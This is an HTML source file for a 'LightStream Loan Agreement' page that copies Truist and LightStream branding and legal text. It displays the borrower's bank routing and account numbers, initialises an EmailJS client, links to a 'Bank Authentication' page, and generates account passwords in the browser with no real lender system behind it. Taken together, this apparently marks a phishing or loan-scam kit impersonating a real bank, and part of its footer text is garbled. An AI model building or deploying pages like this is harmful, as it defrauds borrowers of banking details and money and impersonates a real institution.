<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Agreement - LightStream</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.1.7/dist/signature_pad.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .glass-effect {
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .accordion-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease-out;
        }
        
        .accordion-content.active {
            max-height: 2000px;
            transition: max-height 0.5s ease-in;
        }
        
        #signaturePad {
            touch-action: none;
            cursor: crosshair;
        }
        
        @media print {
            .no-print {
                display: none !important;
            }
            
            .print-only {
                display: block !important;
            }
            
            body {
                background: white !important;
                color: black !important;
            }
            
            .glass-effect {
                background: white !important;
                backdrop-filter: none !important;
                border: 1px solid #ccc !important;
                box-shadow: none !important;
            }
        }
    </style>
</head>

<body class="bg-gradient-to-br from-blue-900 via-indigo-900 to-purple-900 min-h-screen">
    <!-- Navigation -->
    <nav class="bg-black/50 backdrop-blur-md border-b border-gray-700">
        <div class="container mx-auto px-4">
            <div class="flex justify-between items-center py-4">
                <div class="flex items-center space-x-2 mb-4">
                    <!-- Professional Logo -->
                    <div class="relative">
                        <img src="images/newlogo.png" alt="LightStream Logo" class="w-10 h-10 object-contain rounded-lg shadow-lg">
                        <div class="absolute -top-1 -right-1 w-2 h-2 bg-green-500 rounded-full border-2 border-white"></div>
                    </div>
                    <div class="text-xl font-bold text-white">
                        <span class="bg-gradient-to-r from-indigo-600 to-purple-600 bg-clip-text text-transparent">LightStream</span>
                    </div>
                </div>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <section class="py-12">
        <div class="container mx-auto px-4">
            <div class="max-w-4xl mx-auto">
                <!-- Loading State -->
                <div id="loadingState" class="text-center">
                    <div class="inline-flex items-center px-4 py-6 bg-white/10 backdrop-blur-sm rounded-lg">
                        <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-600"></div>
                        <span class="ml-4 text-white text-lg">Generating your loan agreement...</span>
                    </div>
                </div>

                <!-- Agreement Content -->
                <div id="agreementContent" class="hidden">
                    <div class="glass-effect rounded-lg p-8 mb-8">
                        <!-- Header -->
                        <div class="text-center mb-8">
                            <h1 class="text-3xl font-bold text-white mb-4">LightStream Loan Agreement</h1>
                            <div class="flex items-center space-x-2 mb-4">
                                <i class="fas fa-file-contract text-green-500 text-2xl"></i>
                                <span class="text-gray-300">Loan Agreement Number: <span id="loanNumber" class="font-mono text-white">LS-2025001</span></span>
                            </div>
                            <div class="text-gray-300">
                                <p>Date: <span id="currentDate" class="font-semibold">Loading...</span></p>
                            </div>
                        </div>

                        <!-- Loan Summary -->
                        <div class="mb-8">
                            <h2 class="text-2xl font-bold text-white mb-6 flex items-center">
                                <i class="fas fa-calculator text-indigo-500 mr-3"></i>
                                Loan Summary
                            </h2>
                            <div class="grid md:grid-cols-2 gap-6">
                                <div class="bg-white/10 backdrop-blur-sm rounded-lg p-6">
                                    <h3 class="text-lg font-semibold text-white mb-4">Loan Details</h3>
                                    <div class="space-y-3">
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Borrower Name:</span>
                                            <span id="borrowerName" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Loan Amount:</span>
                                            <span id="loanAmount" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Loan Duration:</span>
                                            <span id="loanDuration" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Monthly EMI:</span>
                                            <span id="monthlyEMI" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Total Repayment:</span>
                                            <span id="totalRepayment" class="text-white font-mono">Loading...</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="bg-white/10 backdrop-blur-sm rounded-lg p-6">
                                    <h3 class="text-lg font-semibold text-white mb-4">Borrower Information</h3>
                                    <div class="space-y-3">
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Full Name:</span>
                                            <span id="fullName" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Email:</span>
                                            <span id="email" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Phone:</span>
                                            <span id="phone" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Bank Name:</span>
                                            <span id="bankName" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Routing Number:</span>
                                            <span id="routingNumber" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Account Number:</span>
                                            <span id="accountNumber" class="text-white font-mono">Loading...</span>
                                        </div>
                                        <div class="flex justify-between">
                                            <span class="text-gray-300">Address:</span>
                                            <span id="address" class="text-white font-mono">Loading...</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Terms & Conditions -->
                        <div class="space-y-4">
                            <div class="accordion glass-effect rounded-lg overflow-hidden">
                                <div class="accordion-trigger flex items-center justify-between p-6 cursor-pointer bg-white/10 hover:bg-white/20 transition duration-200">
                                    <h3 class="text-lg font-semibold text-white flex items-center">
                                        <i class="fas fa-file-alt text-indigo-500 mr-3"></i>
                                        Loan Terms & Conditions
                                        <i class="fas fa-chevron-down text-gray-400 transition-transform duration-200"></i>
                                    </h3>
                                </div>
                                <div class="accordion-content bg-white/10 backdrop-blur-sm p-6">
                                    <div class="space-y-4 text-gray-300">
                                        <h4 class="font-semibold text-white mb-2">1. Loan Amount & Purpose</h4>
                                        <p>This agreement confirms the loan amount of <span id="loanAmountTerms" class="font-mono text-white">$5,000.00</span> for the purpose of <strong id="loanPurposeTerms" class="text-white">vacation</strong>.</p>
                                        
                                        <h4 class="font-semibold text-white mb-2">2. Interest Rate & Duration</h4>
                                        <p>Fixed Annual Percentage Rate (APR) of <strong>10.00%</strong> for the entire loan term of <span id="loanDurationTerms" class="font-mono text-white">36 months</span>.</p>
                                        
                                        <h4 class="font-semibold text-white mb-2">3. Monthly Payments</h4>
                                        <p>Monthly payments of <span id="monthlyEMITerms" class="font-mono text-white">$161.61</span> are due on the <span id="paymentDay" class="font-mono text-white">15th</span> day of each month.</p>
                                        
                                        <h4 class="font-semibold text-white mb-2">4. Prepayment</h4>
                                        <p>Early repayment is allowed without prepayment penalties. Borrower may pay off the loan in full at any time without additional charges.</p>
                                        
                                        <h4 class="font-semibold text-white mb-2">5. Late Payments</h4>
                                        <p>Late payments may incur additional fees as specified in the loan agreement.</p>
                                        
                                        <h4 class="font-semibold text-white mb-2">6. Authorization</h4>
                                        <p>Borrower authorizes automatic payments from the specified bank account for loan repayment.</p>
                                        
                                        <h4 class="font-semibold text-white mb-2">7. Governing Law</h4>
                                        <p>This agreement is governed by the laws of the United States.</p>
                                    </div>
                                </div>
                            </div>

                        <!-- Digital Signature -->
                        <div class="glass-effect rounded-lg p-6">
                            <h3 class="text-xl font-bold text-white mb-6 flex items-center">
                                <i class="fas fa-signature text-indigo-500 mr-3"></i>
                                Digital Signature
                            </h3>
                            <div class="bg-white rounded-lg p-4">
                                <div class="mb-4">
                                    <label class="flex items-center text-white mb-2">
                                        <input type="checkbox" id="termsCheckbox" class="mr-2">
                                        <span>I have read and agree to the Loan Terms & Conditions</span>
                                    </label>
                                </div>
                                <div class="mb-4">
                                    <label class="block text-white mb-2">Sign Below:</label>
                                    <canvas id="signaturePad" class="border-2 border-gray-300 rounded-lg bg-white" width="400" height="200" style="touch-action: none; cursor: crosshair; z-index: 10;"></canvas>
                                </div>
                                <div class="flex space-x-4">
                                    <button type="button" id="clearSignatureBtn" class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 transition duration-200">
                                        <i class="fas fa-eraser mr-2"></i>
                                        Clear Signature
                                    </button>
                                    <button type="button" id="submitAgreementBtn" class="flex-1 bg-indigo-600 text-white py-3 rounded-lg hover:bg-indigo-700 transition duration-200 disabled:opacity-50" disabled>
                                        <i class="fas fa-check mr-2"></i>
                                        Submit Agreement
                                    </button>
                                </div>
                            </div>
                        </div>

                        <!-- Action Buttons -->
                        <div class="flex space-x-4 mt-6">
                            <button type="button" id="disagreeBtn" class="flex-1 bg-red-600 text-white py-3 rounded-lg hover:bg-red-700 transition duration-200">
                                <i class="fas fa-times mr-2"></i>
                                I Disagree
                            </button>
                            <button type="button" id="downloadBtn" class="flex-1 bg-green-600 text-white py-3 rounded-lg hover:bg-green-700 transition duration-200">
                                <i class="fas fa-download mr-2"></i>
                                Download PDF
                            </button>
                            <button type="button" id="printBtn" class="flex-1 bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition duration-200">
                                <i class="fas fa-print mr-2"></i>
                                Print Agreement
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Print Header -->
    <div class="print-only">
        <div class="text-center mb-8">
            <h1 class="text-2xl font-bold mb-4">LightStream Loan Agreement</h1>
            <div class="mb-4">
                <span>Loan Agreement Number: <span id="printLoanNumber">LS-2025001</span></span>
                <span>Date: <span id="printCurrentDate">February 19, 2026</span></span>
            </div>
        </div>
    </div>

    <!-- Canonical Footer -->
    <link rel="stylesheet" href="footer.css">
    <!-- Canonical Footer Component - LightStream Website -->
    <footer>
        <div class="footer-container">
            <!-- Footer Links Section -->
            <div class="footer-links">
                <a href="personal-loans.html">Personal Loans</a>
                <a href="bank-auth.html">Bank Authentication</a>
                <a href="faqs.html">FAQs</a>
                <a href="#">Support</a>
                <a href="contact.html">Contact Us</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
            </div>
            
            <!-- Footer Contact Section -->
            <div class="footer-contact">
                <!-- Social Media Icons -->
                <div class="social-icons">
                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
                    <a href="#" aria-label="X"><i class="fab fa-x-twitter"></i></a>
                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
                </div>
            </div>
            
            <!-- Footer Legal Section -->
            <div class="footer-legal">
                <p><strong>Your loan terms, including APR, may differ based on loan purpose, amount, term length, and your credit profile.</strong> Lowest rates require excellent credit. At least 10.003% of approved applicants applying for to lowest rate qualified for to lowest rate available based on data from 10/01/2025 to 12/31/2025. Rate is quoted with AutoPay discount. AutoPay discount is only available prior to loan funding. Rates without AutoPay are 0.50% points higher. Subject to credit approval. Conditions and limitations apply. Advertised rates and terms are subject to change without notice.</p>
                <p><strong>Payment example:</strong> Monthly payments for a $10,000 loan at 10.00% APR with a term of 3 years would result in 36 monthly payments of $306.44.</p>
                <p><strong>Maximum APR for a LightStream loan is 25.39%.</strong> Loan terms range from 24 - 240 months depending on loan type.</p>
                <p><strong>You can fund your loan today if today is a banking business day, your application is approved, and you complete the following steps by 2:30 p.m. Eastern time:</strong></p>
                <ol>
                    <li>review and electronically sign your loan agreement;</li>
                    <li>provide us with your funding preferences and relevant banking information;</li>
                    <li>complete final verification process.</li>
                </ol>
                <div class="footer-grid">
                    <div class="footer-section">
                        <h4>Business Hours (Eastern time)</h4>
                        <p><strong>Customer Service</strong><br>
                        Monday - Friday: 9:30 a.m. to 7 p.m. & Saturday: Noon to 4 p.m.</p>
                        <p><strong>Application Processing</strong><br>
                        Monday - Friday: 10 a.m. to 6 p.m.</p>
                    </div>
                    <div class="footer-section">
                        <h4>Mailing Address</h4>
                        <p>
                            PO Box 117320<br>
                            Atlanta, GA 30368-7320
                        </p>
                    </div>
                </div>
                <div class="legal-copyright">
                    <p><strong>E H L Truist Bank is an Equal Housing Lender. 2025 Truist Financial Corporation.</strong></p>
                    <p>Truist, LightStream, and LightStream logos are service marks of Truist Financial Corporation. All rights reserved.</p>
                    <p>All other trademarks are property of their respective owners. Lending services provided by Truist Bank.</p>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Initialize EmailJS
        (function() {
            emailjs.init("nW8qV4aakkEtYlieZ");
        })();

        // Global signature pad variable
        let signaturePad = null;

        // Calculate EMI using US loan formula
        function calculateEMI(principal, annualRate, months) {
            const monthlyRate = annualRate / 12 / 100;
            const emi = principal * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1);
            return emi;
        }

        // Generate payment schedule
        function generatePaymentSchedule(principal, annualRate, months) {
            const schedule = [];
            const monthlyRate = annualRate / 12 / 100;
            const emi = calculateEMI(principal, annualRate, months);
            let balance = principal;
            const startDate = new Date();

            for (let i = 1; i <= months; i++) {
                const interestPayment = balance * monthlyRate;
                const principalPayment = emi - interestPayment;
                balance -= principalPayment;

                const paymentDate = new Date(startDate);
                paymentDate.setMonth(startDate.getMonth() + i);

                schedule.push({
                    paymentNumber: i,
                    paymentDate: paymentDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' }),
                    paymentAmount: emi.toFixed(2),
                    principal: principalPayment.toFixed(2),
                    interest: interestPayment.toFixed(2),
                    balance: Math.max(0, balance).toFixed(2)
                });
            }

            return schedule;
        }

        // Generate customer credentials
        function generateCredentials(loanData) {
            // Generate unique customer ID: LS + timestamp + random 3 digits
            const timestamp = Date.now();
            const randomDigits = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
            const customerId = `LS${timestamp}-${randomDigits}`;
            
            // Generate 8 character random alphanumeric password
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let password = '';
            for (let i = 0; i < 8; i++) {
                password += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            
            // Username = customer email
            const username = loanData.email || 'Not provided';
            
            const credentials = {
                customerId: customerId,
                username: username,
                password: password,
                loanNumber: 'LS-' + timestamp,
                loanAmount: loanData.loanAmount || 'Not provided',
                customerName: loanData.firstName && loanData.lastName ? 
                    `${loanData.firstName} ${loanData.lastName}` : 
                    (loanData.fullName || 'Not provided')
            };
            
            console.log('ðŸ” Generated credentials:', credentials);
            return credentials;
        }

        // Display credentials on success screen
        function displayCredentials(credentials) {
            // Create credentials display HTML
            const credentialsHTML = `
                <div class="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
                    <h3 class="text-lg font-bold text-green-800 mb-4">ðŸŽ‰ Your Account Credentials</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="font-semibold">Customer ID:</span>
                            <span class="font-mono text-blue-600">${credentials.customerId}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="font-semibold">Username:</span>
                            <span class="font-mono text-blue-600">${credentials.username}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="font-semibold">Password:</span>
                            <span class="font-mono text-red-600">${credentials.password}</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="font-semibold">Loan Number:</span>
                            <span class="font-mono text-blue-600">${credentials.loanNumber}</span>
                        </div>
                    </div>
                    <div class="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded">
                        <p class="text-sm text-yellow-800">
                            <strong>Important:</strong> Please save your credentials securely. 
                            You will need these to access your account.
                        </p>
                    </div>
                </div>
                <div class="text-center">
                    <button onclick="window.location.href='login.html'" 
                            class="bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition duration-200">
                        Go to Login Page
                    </button>
                </div>
            `;
            
            // Replace agreement content with credentials
            const agreementContent = document.querySelector('.main-container');
            if (agreementContent) {
                agreementContent.innerHTML = credentialsHTML;
            }
        }

        // Load loan data from localStorage
        function loadLoanData() {
            const storedData = localStorage.getItem('loanApplicationData');
            if (!storedData) {
                // Try alternative key
                const altData = localStorage.getItem('loanData');
                if (!altData) {
                    alert('No loan application data found. Please start your application again.');
                    window.location.href = 'personal-loans.html';
                    return;
                }
                loanData = JSON.parse(altData);
                console.log('âœ… Loan data loaded from loanData:', loanData);
                populateAgreement(loanData);
                return;
            }
            loanData = JSON.parse(storedData);
            console.log('âœ… Loan data loaded from loanApplicationData:', loanData);
            populateAgreement(loanData);
        }

        // Populate agreement with loan data
        function populateAgreement(loanData) {
            console.log('ðŸ”„ Populating agreement with data:', loanData);
            
            // Calculate loan details
            const principal = parseFloat(loanData.loanAmount) || 0;
            const annualRate = 10; // 10% APR
            const months = parseInt(loanData.loanDuration) || 36;
            const emi = calculateEMI(principal, annualRate, months);
            const totalRepayment = emi * months;

            // Fix full name extraction
            const fullName = loanData.name || loanData.fullName || `${loanData.firstName || ''} ${loanData.lastName || ''}`.trim() || 'Not provided';

            // Bank name mapping
            const bankNames = {
                'chase': 'Chase Bank',
                'bank-of-america': 'Bank of America',
                'wells-fargo': 'Wells Fargo',
                'citibank': 'Citibank',
                'capital-one': 'Capital One',
                'us-bank': 'U.S. Bank',
                'pnc': 'PNC Bank',
                'td-bank': 'TD Bank',
                'huntington': 'Huntington Bank',
                'ally': 'Ally Bank',
                'other': 'Other Bank'
            };
            
            const bankValue = loanData.customerBank || loanData.bankName || 'other';
            const bankName = bankNames[bankValue] || 'Not provided';

            // Populate basic info
            document.getElementById('loanNumber').textContent = 'LS-' + Date.now();
            document.getElementById('currentDate').textContent = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });

            // Populate loan summary
            document.getElementById('borrowerName').textContent = fullName;
            document.getElementById('loanAmount').textContent = '$' + principal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            document.getElementById('loanDuration').textContent = months + ' months';
            document.getElementById('monthlyEMI').textContent = '$' + emi.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            document.getElementById('totalRepayment').textContent = '$' + totalRepayment.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

            // Populate borrower details
            document.getElementById('fullName').textContent = fullName;
            document.getElementById('email').textContent = loanData.email || 'Not provided';
            document.getElementById('phone').textContent = loanData.phone || 'Not provided';
            document.getElementById('bankName').textContent = bankName;
            document.getElementById('routingNumber').textContent = loanData.routingNumber || 'Not provided';
            document.getElementById('accountNumber').textContent = loanData.accountNumber || 'Not provided';
            document.getElementById('address').textContent = loanData.streetAddress || loanData.address || 'Not provided';
            
            // Create complete address string
            const completeAddress = [
                loanData.streetAddress || loanData.address || 'Not provided',
                loanData.city || 'Not provided',
                loanData.state || 'Not provided',
                loanData.zipCode || 'Not provided'
            ].filter(part => part && part !== 'Not provided').join(', ');
            
            document.getElementById('address').textContent = completeAddress || 'Not provided';
            
            // Populate print header
            document.getElementById('printLoanNumber').textContent = 'LS-' + Date.now();
            document.getElementById('printCurrentDate').textContent = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });

            // Populate terms
            document.getElementById('loanAmountTerms').textContent = '$' + principal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            document.getElementById('loanDurationTerms').textContent = months + ' months';
            document.getElementById('monthlyEMITerms').textContent = '$' + emi.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            document.getElementById('paymentDay').textContent = new Date().getDate();

            // Generate payment schedule
            const schedule = generatePaymentSchedule(principal, annualRate, months);
            const scheduleBody = document.getElementById('paymentSchedule');
            if (scheduleBody) {
                scheduleBody.innerHTML = '';

                schedule.forEach(payment => {
                    const row = document.createElement('tr');
                    row.className = 'border-b border-gray-700';
                    row.innerHTML = `
                        <td class="p-2">${payment.paymentNumber}</td>
                        <td class="p-2">${payment.paymentDate}</td>
                        <td class="p-2 text-right">$${payment.paymentAmount}</td>
                        <td class="p-2 text-right">$${payment.principal}</td>
                        <td class="p-2 text-right">$${payment.interest}</td>
                        <td class="p-2 text-right">$${payment.balance}</td>
                    `;
                    scheduleBody.appendChild(row);
                });
            }

            // Show agreement content
            document.getElementById('loadingState').classList.add('hidden');
            document.getElementById('agreementContent').classList.remove('hidden');
        }

        // Initialize accordion functionality
        function initializeAccordions() {
            const triggers = document.querySelectorAll('.accordion-trigger');
            
            triggers.forEach(trigger => {
                trigger.addEventListener('click', () => {
                    const content = trigger.nextElementSibling;
                    const icon = trigger.querySelector('i');
                    
                    // Toggle current accordion
                    content.classList.toggle('active');
                    icon.classList.toggle('rotate-180');
                    
                    // Close other accordions (optional - remove for multiple open)
                    triggers.forEach(otherTrigger => {
                        if (otherTrigger !== trigger) {
                            const otherContent = otherTrigger.nextElementSibling;
                            const otherIcon = otherTrigger.querySelector('i');
                            otherContent.classList.remove('active');
                            otherIcon.classList.remove('rotate-180');
                        }
                    });
                });
            });
        }

        // Handle agreement buttons
        function handleAgreementButtons() {
            const agreeBtn = document.getElementById('submitAgreementBtn');
            const disagreeBtn = document.getElementById('disagreeBtn');
            const downloadBtn = document.getElementById('downloadBtn');
            const printBtn = document.getElementById('printBtn');

            console.log('ðŸ”˜ Agreement buttons found:', {
                agreeBtn: !!agreeBtn,
                disagreeBtn: !!disagreeBtn,
                downloadBtn: !!downloadBtn,
                printBtn: !!printBtn
            });

            agreeBtn.addEventListener('click', () => {
                // Direct agreement - no OTP verification needed
                if (confirm('Are you sure you agree to this loan agreement?')) {
                    // Get loan data from localStorage
                    const storedLoanData = localStorage.getItem('loanApplicationData');
                    if (!storedLoanData) {
                        const altData = localStorage.getItem('loanData');
                        if (!altData) {
                            alert('No loan data found. Please start your application again.');
                            return;
                        }
                        loanData = JSON.parse(altData);
                    } else {
                        loanData = JSON.parse(storedLoanData);
                    }
                    
                    // Generate credentials
                    const credentials = generateCredentials(loanData);
                    
                    // Save credentials to localStorage key "customerAccount"
                    localStorage.setItem('customerAccount', JSON.stringify(credentials));
                    console.log('ðŸ’¾ Credentials saved to localStorage:', credentials);
                    
                    // Display credentials on agreement success screen
                    displayCredentials(credentials);
                    
                    console.log('ðŸŽ‰ Agreement accepted and credentials generated');
                }
            });

            disagreeBtn.addEventListener('click', () => {
                if (confirm('Are you sure you want to cancel this loan agreement?')) {
                    window.location.href = 'loan-cancelled.html';
                }
            });

            // Disable download and print buttons initially
            downloadBtn.addEventListener('click', (e) => {
                e.preventDefault();
                alert('Please agree to the loan agreement first before downloading.');
            });

            printBtn.addEventListener('click', (e) => {
                e.preventDefault();
                alert('Please agree to the loan agreement first before printing.');
            });
        }

        // Initialize signature pad
        function initializeSignaturePad() {
            console.log('ðŸ” Initializing signature pad...');
            const canvas = document.getElementById('signaturePad');
            console.log('ðŸ“ Canvas element found:', canvas);
            if (!canvas) {
                console.error('âŒ Signature pad canvas not found!');
                return;
            }

            console.log('ðŸŽ¨ Creating SignaturePad instance...');
            signaturePad = new SignaturePad(canvas, {
                backgroundColor: 'rgb(255, 255, 255)',
                penColor: 'rgb(0, 0, 0)'
            });
            console.log('âœ… SignaturePad created:', signaturePad);

            // Handle signature clear
            const clearBtn = document.getElementById('clearSignatureBtn');
            if (clearBtn) {
                clearBtn.addEventListener('click', () => {
                    console.log('ðŸ§¹ Clearing signature...');
                    signaturePad.clear();
                });
            }

            // Handle signature end
            signaturePad.addEventListener('endStroke', () => {
                console.log('âœï¸ Signature stroke ended');
                checkSignatureValidity();
            });

            // Test if signature pad is working
            canvas.addEventListener('mousedown', (e) => {
                console.log('ðŸ–±ï¸ Mouse down on canvas');
            });
            
            canvas.addEventListener('touchstart', (e) => {
                console.log('ðŸ‘† Touch start on canvas');
            });

            console.log('âœ… Signature pad initialization complete');
        }

        // Check signature validity
        function checkSignatureValidity() {
            const termsCheckbox = document.getElementById('termsCheckbox');
            const submitBtn = document.getElementById('submitAgreementBtn');
            const isEmpty = signaturePad ? signaturePad.isEmpty() : true;
            
            // Enable submit button only if terms are accepted and signature is not empty
            if (termsCheckbox.checked && !isEmpty) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        }

        // Initialize everything when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            console.log('ðŸ”„ Initializing loan agreement page...');
            
            // Load loan data first
            loadLoanData();
            
            // Initialize other components
            initializeAccordions();
            handleAgreementButtons();
            initializeSignaturePad();
            
            console.log('âœ… Loan agreement page initialized');
        });
    </script>
</body>
</html>
